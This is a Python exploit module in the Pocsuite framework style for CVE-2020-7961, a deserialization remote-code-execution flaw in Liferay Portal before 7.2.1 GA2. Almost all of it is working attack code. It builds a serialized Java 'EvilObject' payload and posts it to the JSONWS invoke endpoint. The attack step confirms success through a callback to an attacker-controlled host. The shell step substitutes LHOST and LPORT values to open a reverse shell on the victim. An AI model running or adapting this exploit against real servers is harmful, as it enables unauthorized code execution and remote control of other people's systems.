"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Tools.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
import random
from urllib.parse import urlparse, urljoin
import binascii
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from constvalue import * 
from contact_vps import cve_2020_7961

class DemoPOC(POCBase):
    vulID = 'CVE-2020-7961'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '30/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2020-7961']
    name = 'Liferay < 7.2.1 GA2 deserialization RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.JAVA]}
    appName = 'liferay-cve-2020-7961'
    appVersion = 'Liferay < 7.2.1 GA2'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''Deserialization of Untrusted Data in Liferay Portal prior to 7.2.1 CE GA2 allows remote attackers to execute arbitrary code via JSON web services (JSONWS).'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.8 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url): 
        resp = requests.get(self.url, verify=False)
        fixed_version = "7.2.1" 
        try: 
            match = re.findall(
                r'[0-9]+\.[0-9]+\.[0-9]',
                resp.headers['Liferay-Portal']
            )
            if(match[0]) < fixed_version: 
                return True
            else: 
                return False
        except: return False
         

    def _verify(self):
        result = {}
        check = self.check_version(self.url)
        if check: 
            r = requests.get(self.url + "/api/jsonws", verify=False) 
            if(r.status_code == 200): 
                result['VerifyInfo'] = {} 
                result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)   
    def _attack(self):
        flag = uuid.uuid4().hex
        uniq_url = "http://" + PUBLIC_IP + ":65535/"+ flag
        result = {}
        check = self.check_version(self.url)
        if check:
            filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject_source.java')
            with open(filename_source, "rb") as file:
                shell  = file.read().decode()
                file.close()
            shell = shell.replace("UNIQUE_URL", uniq_url)
            filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject1.java')
            with open(filename, 'wb') as file: 
                file.write(str.encode(shell))
                file.close() 
            Object_data = cve_2020_7961(filename,"EvilObject1" )
            data = {
            'cmd': '''{"/expandocolumn/update-column":{}}''', 
'p_auth': "YbnafeBK", 
'formDate': 1614646547626, 
'columnId': random.randint(1,100), 
'name': random.randint(1,100), 
'type': random.randint(1,100), 
'defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource': Object_data
            }
        
            r = requests.post( self.url+ "/api/jsonws/invoke", data = data, verify=False)
            res = requests.get("http://" + PUBLIC_IP + ":65535/logfile.txt")
            if(flag in res.text): 
                result['ShellInfo'] = {}
                result['ShellInfo']["Url"] = self.url 
                result['ShellInfo']['payload'] = Object_data 
            else: return
        return self.parse_output(result)        

    def _shell(self):
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject_shell_source.java')
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject.java')
        with open(filename_source, "rb") as file:
            shell  = file.read().decode()
            file.close()
        shell = shell.replace('LHOST_cve_2020_7961', datainput['LHOST'])
        shell = shell.replace('LPORT_cve_2020_7961', str(datainput['LPORT']))
        with open(filename, "wb") as file:
            file.write( str.encode(shell))
            file.close()
        Object_data = cve_2020_7961(filename, "EvilObject")
        data = {
            'cmd': '''{"/expandocolumn/update-column":{}}''', 
'p_auth': "YbnafeBK", 
'formDate': 1614646547626, 
'columnId': random.randint(1,100), 
'name': random.randint(1,100), 
'type': random.randint(1,100), 
'defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource': Object_data
            }
        urlexploit = datainput['entrypoint']
        print(Object_data)
        r = requests.post(urlexploit + "/api/jsonws/invoke", data = data, verify=False)
        print("thuc thi shell thanh cong")
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
